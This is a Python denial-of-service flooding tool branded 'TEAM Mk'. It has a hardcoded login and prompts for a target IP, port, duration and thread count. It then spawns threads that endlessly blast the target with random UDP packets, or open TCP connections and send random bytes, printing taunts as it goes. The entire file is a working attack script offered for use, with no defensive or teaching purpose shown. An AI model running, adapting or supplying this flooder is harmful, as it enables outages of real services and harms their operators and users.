import random
import socket
import threading
import platform
import codecs
import struct
import time
import socket
import sys
import os

###### TEAM Mk!!! #####
os.system("clear")
os.system("None")
print("\033[32m DDoS Team丶Mk丶Is Loding ")
time.sleep(2)
print("Loading...")
os.system("clear")

#### Login       

attemps = 0

while attemps < 100:
    username = input('\033[34m Your Username : ')
    password = input('\033[34m Your Password : ')
    if username == 'DIGA' and password == 'DIGA':
        print('Mrhba Bik M3ana Fi Team!!')
        break
    else:
        print('\033[31m username w password ghalt')
        attemps += 1
        continue
os.system("clear")

print("DDoS Is Loding : "+platform.system())

if platform.system() == 'Windows':

	print("""
 TEAM Mk is Loding... :

AUTHOR TOOLS : DIGA
        ╔═╗╔═╗╔╦╗╔═╗   
	╚═╗╠═╣║║║╠═╝──
	╚═╝╩ ╩╩ ╩╩      V 1.5
""")
else :
	print("""
	'\033[31m'

        ╔═╗╔═╗╔╦╗╔═╗   
	╚═╗╠═╣║║║╠═╝──
	╚═╝╩ ╩╩ ╩╩      
	
	Devloper : DIGA
			""")


print('DDos On')
ip= str(input("                    Ip :"))
port= int(input("                    port :"))
choice = str(input("                   Your Attack? (y/n) :"))
times= int(input("                   Time Mk :"))
threads= int(input("                    threads :"))
fake_ip = '154.121.76.200'
#Starting Attacking
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"TEAM '\033[31m Mk' YNIKKOM!")
		except:
			print("[!] TEAM Mk YNIKKOM!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[+]","[x]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"TEAM '\033[32m Mk' YNIKKOM!")
		except:
			s.close()
			print("[*] TEAM Mk YNIKKOM!")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
